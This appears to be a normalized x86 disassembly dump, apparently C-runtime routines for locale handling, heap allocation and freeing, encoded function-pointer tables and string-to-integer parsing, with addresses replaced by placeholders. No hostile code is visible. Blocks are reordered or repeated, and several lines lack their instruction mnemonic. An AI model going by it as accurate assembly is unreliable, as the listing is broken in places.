mov eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
push [ eax ]
push r--data
push [ ecx ]
push 0x3
push 0x351
push edi
call sub_42c005
mov eax [ ebp - 0x4 ]
add esp 0x18
cmp eax r--data
jl r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax edi
[ ecx ] eax
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax edi
[ ecx ] eax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
xor eax eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x20 ] eax
mov eax [ esi + 0x40 ]
jmp r-xdata
[ eax ] edi
dec edi
jne r-xdata
push [ esi + 0x28 ]
call sub_42d0aa
pop ecx
and [ esi + 0x24 ] 0x0
lea eax [ ebx + 0x4 ]
and [ esi + 0x1c ] 0x0
mov [ esi + 0x28 ] ebx
mov [ esi + 0x20 ] eax
[ eax ] edi
dec edi
jne r-xdata
push [ esi + 0x28 ]
call sub_42d0aa
pop ecx
pop edi
push [ esi + 0x24 ]
call sub_42d0aa
pop ecx
push [ esi + 0x24 ]
call sub_42d0aa
pop ecx
sub_42c25f
mov edi edi
push ebp
mov ebp esp
sub esp 0x1d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x1c8 ] edi
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x1c0 ] 0x1
mov [ ebp - 0x1cc ] eax
mov ebx eax
mov [ ebp - 0x1bc ] ebx
test esi esi
je r-xdata
test esi esi
je r-xdata
push edi
call sub_42c0c6
pop ecx
cmp [ esi ] 0x4c
jne r-xdata
add eax 0x2
add eax eax
mov eax [ edi + eax * 8 ]
jmp r-xdata
push esi
push eax
push edi
call sub_42c544
add esp 0xc
jmp r-xdata
push eax
push 0x55
lea eax [ ebp - 0x1b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42ba52
add esp 0x18
test eax eax
je r-xdata
cmp [ esi + 0x2 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
xor ecx ecx
lea edx [ edi + 0x20 ]
mov esi ecx
mov [ ebp - 0x1bc ] edx
cmp [ esi + 0x4 ] 0x5f
jne r-xdata
mov eax [ ebp - 0x1c0 ]
mov ecx [ edx ]
lea eax [ ebp - 0x10c ]
push r--data
push esi
call sub_43ad02
mov ebx eax
mov [ ebp - 0x1d0 ] ebx
pop ecx
pop ecx
test ebx ebx
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
sbb eax eax
or eax 0x1
xor ecx ecx
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
sub eax esi
sar eax 0x1
mov [ ebp - 0x1c0 ] eax
je r-xdata
test ebx ebx
inc ebx
lea eax [ ebp - 0x10c ]
push eax
push esi
push edi
call sub_42c544
mov edx [ ebp - 0x1bc ]
add esp 0xc
test eax eax
je r-xdata
xor ecx ecx
mov eax ecx
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
mov [ ebp - 0x1c2 ] dx
mov edx [ ebp - 0x1bc ]
jne r-xdata
push 0x3b
pop eax
cmp [ ebx ] ax
je r-xdata
mov eax ecx
jmp r-xdata
xor ecx ecx
mov eax ecx
mov [ ebp - 0x1c0 ] eax
jmp r-xdata
inc ebx
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
cmp [ ebp - 0x1c2 ] 0x0
jne r-xdata
mov edi [ ebp - 0x1c0 ]
mov ebx r--data
mov [ ebp - 0x1c4 ] 0x1
inc esi
add edx 0x10
mov [ ebp - 0x1bc ] edx
cmp esi 0x5
jle r-xdata
mov di [ eax ]
cmp di [ ecx ]
mov edi [ ebp - 0x1c8 ]
jne r-xdata
inc [ ebp - 0x1c4 ]
add ebx 0xc
cmp ebx r--data
jle r-xdata
mov ecx [ ebx ]
lea edx [ ecx + 0x2 ]
push edi
push esi
push [ ebx ]
call sub_43acc8
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1d0 ]
add ebx 0x2
push r--data
push ebx
call sub_43ac78
mov edi [ ebp - 0x1c8 ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1cc ]
jne r-xdata
sub ecx edx
sar ecx 0x1
cmp edi ecx
je r-xdata
cmp [ ebp - 0x1c4 ] 0x5
jg r-xdata
push 0x3b
pop eax
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebp - 0x1bc ]
push esi
push ebx
lea eax [ ebp - 0x10c ]
push 0x83
push eax
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
test eax eax
jmp r-xdata
add esi 0x2
cmp [ esi ] cx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
lea eax [ esi + esi ]
cmp eax 0x106
jae r-xdata
jne r-xdata
call sub_40c94a
xor ecx ecx
mov [ ebp + eax - 0x10c ] cx
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x1c4 ]
push edi
call sub_42c544
add esp 0xc
test eax eax
mov eax [ ebp - 0x1bc ]
je r-xdata
lea esi [ ebx + esi * 2 ]
xor ecx ecx
cmp [ esi ] cx
je r-xdata
inc eax
mov [ ebp - 0x1bc ] eax
jmp r-xdata
sub_42c544
mov edi edi
push ebp
mov ebp esp
sub esp 0x2e4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x2e4 ] ebx
call sub_42fa1d
add eax 0x278
mov [ ebp - 0x2d4 ] eax
lea eax [ ebp - 0x2c0 ]
push eax
push 0x55
lea eax [ ebp - 0x2b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42ba52
add esp 0x18
test eax eax
jne r-xdata
lea esi [ ebx + 0x2 ]
shl esi 0x4
lea eax [ ebp - 0x10c ]
mov [ ebp - 0x2c8 ] esi
mov edx [ esi + edi ]
mov ecx edx
xor eax eax
sbb eax eax
or eax 0x1
cmp [ eax ] 0x0
je r-xdata
lea ecx [ ebp - 0x10c ]
lea edx [ ecx + 0x2 ]
mov eax edx
jmp r-xdata
mov eax [ ebp - 0x2bc ]
jmp r-xdata
mov si [ eax + 0x2 ]
cmp si [ ecx + 0x2 ]
mov [ ebp - 0x2c2 ] si
mov esi [ ebp - 0x2c8 ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x2bc ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x2cc ] eax
lea eax [ eax * 2 + 0x4 ]
push eax
call sub_42d0e4
mov [ ebp - 0x2d8 ] eax
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
add eax 0x4
add ecx 0x4
cmp [ ebp - 0x2c2 ] 0x0
jne r-xdata
mov ecx [ esi + edi ]
add eax 0x4
mov [ ebp - 0x2d0 ] ecx
mov ecx [ edi + ebx * 4 + 0xa0 ]
mov [ ebp - 0x2dc ] ecx
mov ecx [ edi + 0x8 ]
mov [ ebp - 0x2e0 ] ecx
lea ecx [ ebp - 0x10c ]
push ecx
push [ ebp - 0x2cc ]
mov [ ebp - 0x2c4 ] eax
push eax
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
mov si [ eax ]
and [ ebp - 0x2bc ] 0x0
cmp si [ ecx ]
mov esi [ ebp - 0x2c8 ]
jne r-xdata
mov eax [ ebp - 0x2bc ]
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
cmp [ ebp - 0x10c ] 0x43
mov eax [ ebp - 0x2c4 ]
mov [ esi + edi ] eax
jne r-xdata
lea eax [ ebp - 0x2b8 ]
push eax
call sub_42b6fb
pop ecx
mov ecx [ ebp - 0x2bc ]
mov [ edi + ebx * 4 + 0xa0 ] eax
cmp [ ebp - 0x10a ] 0x0
jne r-xdata
cmp ebx 0x1
jne r-xdata
mov esi [ ebp - 0x2d4 ]
mov edx ecx
mov eax [ ebp - 0x2c0 ]
mov ecx esi
mov [ edi + 0x8 ] eax
mov [ ebp - 0x2c4 ] esi
mov eax [ esi + 0x20 ]
mov [ ebp - 0x2cc ] eax
mov eax [ esi + 0x24 ]
mov [ ebp - 0x2c0 ] eax
mov ecx [ ebp - 0x2bc ]
mov [ edi + ebx * 4 + 0xa0 ] ecx
jmp r-xdata
cmp ebx 0x5
jne r-xdata
mov eax [ ebp - 0x2c0 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
test edx edx
je r-xdata
mov esi [ ebp - 0x2c4 ]
inc edx
mov eax [ ecx ]
mov ebx [ ebp - 0x2cc ]
mov ecx [ ecx + 0x4 ]
mov [ esi ] ebx
mov ebx [ ebp - 0x2c0 ]
mov [ ebp - 0x2c0 ] ecx
mov ecx esi
add ecx 0x8
mov [ esi + 0x4 ] ebx
mov ebx [ ebp - 0x2e4 ]
mov esi [ ebp - 0x2d4 ]
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x2c4 ] ecx
cmp edx 0x5
jl r-xdata
cmp ebx 0x2
jne r-xdata
imul eax ebx 0xc
push edi
mov esi [ eax + r--data ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
mov ecx [ ebp - 0x2d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2c0 ]
mov [ edi + 0x14 ] eax
cmp edx 0x5
jne r-xdata
mov eax [ esi + edx * 8 ]
mov [ esi ] eax
mov eax [ esi + edx * 8 + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x2cc ]
mov [ esi + edx * 8 ] eax
mov eax [ ebp - 0x2c0 ]
mov [ esi + edx * 8 + 0x4 ] eax
mov eax [ edi + 0x8 ]
cmp eax [ ecx ]
je r-xdata
jmp r-xdata
cmp ecx rw-data
je r-xdata
mov eax [ ebp - 0x2c8 ]
mov [ eax + edi ] ecx
push [ edi + ebx * 4 + 0xa0 ]
call sub_42d0aa
mov ecx [ ebp - 0x2d8 ]
mov eax [ ebp - 0x2dc ]
push ecx
mov [ edi + ebx * 4 + 0xa0 ] eax
call sub_42d0aa
mov eax [ ebp - 0x2e0 ]
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x18 ] eax
jmp r-xdata
push 0x1
push [ edi + 0x8 ]
lea eax [ ebp - 0x20c ]
push eax
push 0x7f
push r--data
push 0x1
push [ ebp - 0x2bc ]
call sub_43ad9c
add esp 0x1c
test eax eax
mov eax [ ebp - 0x2bc ]
je r-xdata
mov eax [ ebp - 0x2c8 ]
mov esi ebx
or ecx 0xffffffff
add esi esi
mov eax [ edi + esi * 8 + 0x28 ]
[ eax ] ecx
jne r-xdata
mov [ esi + 0x4 ] eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x20c ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push [ edi + esi * 8 + 0x28 ]
call sub_42d0aa
push [ edi + esi * 8 + 0x24 ]
call sub_42d0aa
push [ edi + ebx * 4 + 0xa0 ]
call sub_42d0aa
mov eax [ ebp - 0x2c8 ]
add esp 0xc
mov ecx [ ebp - 0x2bc ]
mov [ eax + edi ] ecx
mov [ edi + ebx * 4 + 0xa0 ] ecx
jmp r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push eax
call sub_449b82
xor ecx ecx
add esp 0xc
test eax eax
sete cl
mov [ esi + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x2d8 ]
add ebx ebx
mov [ ecx ] 0x1
mov eax [ eax + edi ]
mov [ edi + ebx * 8 + 0x28 ] ecx
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ esi ] eax
sub_42c93b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
pop ebp
retn
cmp eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
pop ebp
retn
sub_42c99f
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_42c9e0
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
push 0x2
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_42cbd7
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42ca31
neg esi
sbb esi esi
not esi
and esi edi
mov eax esi
call sub_40d2a6
retn
sub_42ca52
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push rw-data
call sub_42c9e0
neg eax
pop ecx
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_42ca6f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push rw-data
call sub_42c9e0
neg eax
pop ecx
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_42ca8c
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov edx [ rw-data ]
mov eax edx
push ebx
mov ebx [ esi + 0x4 ]
and eax 0x1f
push edi
mov edi [ esi ]
mov ecx eax
xor edi edx
xor ebx edx
ror edi cl
ror ebx cl
test edi edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
xor eax eax
pop ebx
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x14 ] ebx
cmp edi 0xffffffff
je r-xdata
cmp [ ebx ] ecx
je r-xdata
mov eax edx
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
push edi
call sub_42d0aa
mov edx [ rw-data ]
pop ecx
sub ebx 0x4
cmp ebx edi
jb r-xdata
mov esi [ ebx ]
mov [ ebx ] ecx
xor esi edx
mov ecx eax
ror esi cl
mov ecx esi
call [ r--data ]
call esi
mov esi [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax edx
and eax 0x1f
mov ecx [ esi ]
xor ecx edx
mov [ ebp - 0xc ] ecx
mov ecx eax
ror [ ebp - 0xc ] cl
mov ecx [ esi + 0x4 ]
xor ecx edx
mov [ ebp - 0x8 ] ecx
mov ecx eax
ror [ ebp - 0x8 ] cl
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] ecx
mov edi ecx
mov ecx [ ebp - 0x8 ]
mov ebx ecx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ ebp - 0x8 ] ecx
push 0x20
pop ecx
je r-xdata
push 0x20
pop ecx
and [ ebp - 0x8 ] 0x0
sub ecx eax
ror [ ebp - 0x8 ] cl
mov ecx [ ebp - 0x8 ]
xor ecx edx
mov ecx [ ebp - 0xc ]
sub_42cb9a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn
sub_42cbd7
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ rw-data ]
mov ecx eax
mov edx [ ebx + 0x4 ]
and ecx 0x1f
push esi
mov esi [ ebx + 0x8 ]
xor edx eax
push edi
mov edi [ ebx ]
xor esi eax
xor edi eax
ror edx cl
ror esi cl
ror edi cl
mov [ ebp - 0x4 ] edx
cmp edx esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0xc ]
call sub_42c99f
mov ecx [ ebp - 0x4 ]
push edi
mov [ ecx ] eax
call sub_40cb50
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call sub_40cb50
push esi
mov [ ebx + 0x4 ] eax
call sub_40cb50
add esp 0x10
mov [ ebx + 0x8 ] eax
xor eax eax
sub esi edi
mov eax 0x200
sar esi 0x2
cmp esi eax
ja r-xdata
pop ebx
mov esp ebp
pop ebp
retn
add eax esi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax esi
cmp eax esi
jb r-xdata
push 0x20
pop eax
mov [ ebp - 0x8 ] eax
lea eax [ esi + 0x4 ]
push 0x4
push eax
push edi
mov [ ebp - 0x8 ] eax
call sub_43c4d1
push 0x0
mov [ ebp - 0x4 ] eax
call sub_42d0aa
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
push 0x4
push eax
push edi
call sub_43c4d1
push 0x0
mov [ ebp - 0x4 ] eax
call sub_42d0aa
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov edi ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push 0x20
lea esi [ ecx + eax * 4 ]
mov eax [ rw-data ]
and eax 0x1f
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov edx ecx
mov [ ebp - 0x8 ] eax
mov eax esi
sub eax ecx
add eax 0x3
shr eax 0x2
cmp esi ecx
sbb ecx ecx
not ecx
and ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
xor eax eax
pop edi
pop esi
inc eax
mov [ edx ] ecx
lea edx [ edx + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
sub_42cd50
mov eax [ rw-data ]
push esi
push 0x20
and eax 0x1f
xor esi esi
pop ecx
sub ecx eax
ror esi cl
xor esi [ rw-data ]
push esi
call sub_42fd1c
push esi
call sub_429793
push esi
call sub_43c8ec
push esi
call sub_429cd7
push esi
call sub_417103
add esp 0x14
mov al 0x1
pop esi
retn
sub_42cd96
mov eax [ rw-data ]
or ecx 0xffffffff
push esi
[ eax ] ecx
jne r-xdata
push [ rw-data ]
call sub_42d0aa
push [ rw-data ]
xor esi esi
mov [ rw-data ] esi
call sub_42d0aa
push [ rw-data ]
mov [ rw-data ] esi
call sub_42d0aa
push [ rw-data ]
mov [ rw-data ] esi
call sub_42d0aa
add esp 0x10
mov [ rw-data ] esi
mov al 0x1
pop esi
retn
mov eax [ rw-data ]
mov esi rw-data
cmp eax esi
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov [ rw-data ] esi
sub_42ce10
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_42ce8a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_43d59e
call sub_43d59e
mov [ esi ] eax
jmp r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_43d59e
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_42cf11
mov edi edi
push ebp
mov ebp esp
call sub_42fa1d
mov edx eax
mov eax [ edx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ edx + 0xc ] ecx
pop ebp
retn
mov eax sub_42d153
sub_42cf31
push 0xc
push r--data
call sub_4497c0
call sub_42fa1d
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
call sub_42d153
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42cf6d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_42fef5
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
mov [ edx ] 0x0
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ edx ] cl
call sub_42fef5
push 0x22
jmp r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
sub_42cfc7
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_42fef5
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
mov [ edx ] 0x0
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor esi esi
jmp r-xdata
mov [ edx ] cl
call sub_42fef5
push 0x22
jmp r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov eax esi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_42fdcf
sub_42d036
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
push esi
push 0x1bf
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
jmp r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx eax
mov edx rw-data
xchg [ edx ] ecx
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
jmp r-xdata
pop esi
sub_42d0aa
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_42fef5
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_42fe7c
pop ecx
mov [ esi ] eax
pop esi
sub_42d0e4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
call sub_42fef5
mov [ eax ] 0xc
xor eax eax
test esi esi
jne r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_42c935
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4297a7
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_42d132
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
not edx
mov ecx [ ebp + 0x8 ]
and edx eax
and ecx [ ebp + 0xc ]
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_42d153
call sub_43c8d5
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_43c939
pop ecx
push 0x3
call sub_417130
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_42fbe1
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_42d196
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jb r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0xc
xor eax eax
call sub_42c935
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4297a7
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_42d200
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
mov ecx [ ebp + 0xc ]
and eax 0x2
je r-xdata
test eax eax
jne r-xdata
cmp ecx 0x80000000
ja r-xdata
cmp ecx 0x7fffffff
ja r-xdata
sub_42d240
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0x2
je r-xdata
test eax eax
jne r-xdata
cmp edx 0x80000000
jb r-xdata
cmp edx 0x7fffffff
jb r-xdata
ja r-xdata
ja r-xdata
test ecx ecx
jne r-xdata
cmp ecx 0xffffffff
ja r-xdata
sub_42d290
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_42d2b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_42d2d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
cmp [ ebp + 0xc ] 0x0
push esi
push edi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor edi edi
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov esi [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
call sub_41cb44
mov esi [ ebp + 0xc ]
xor edi edi
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] esi
cmp eax 0x2
jl r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ eax ] esi
mov eax [ ecx ]
movzx eax [ eax + edx * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
push 0x8
push edx
call sub_43dba1
mov esi [ ebp + 0xc ]
add esp 0xc
mov ecx [ ebp - 0x1c ]
jmp r-xdata
cmp eax 0x24
jle r-xdata
mov bl [ esi ]
inc esi
mov [ ebp + 0xc ] esi
cmp [ ecx + 0x4 ] 0x1
movzx edx bl
jle r-xdata
cmp [ ebp + 0x18 ] al
setne al
mov [ ebp - 0x4 ] eax
cmp bl 0x2d
jne r-xdata
test eax eax
jne r-xdata
cmp bl 0x2b
jne r-xdata
or eax 0x2
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
mov bl [ esi ]
inc esi
mov [ ebp + 0xc ] esi
lea eax [ ebx - 0x30 ]
cmp al 0x9
ja r-xdata
cmp ecx 0x10
jne r-xdata
lea eax [ ebx - 0x61 ]
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffd0
jmp r-xdata
xor edx edx
or eax 0xffffffff
div [ ebp + 0x14 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea esp [ esp ]
lea eax [ ebx - 0x41 ]
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffa9
jmp r-xdata
test eax eax
jne r-xdata
lea eax [ ebx - 0x61 ]
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffd0
jmp r-xdata
test ecx ecx
jne r-xdata
movsx eax bl
add eax 0xffffffc9
mov al [ esi ]
inc esi
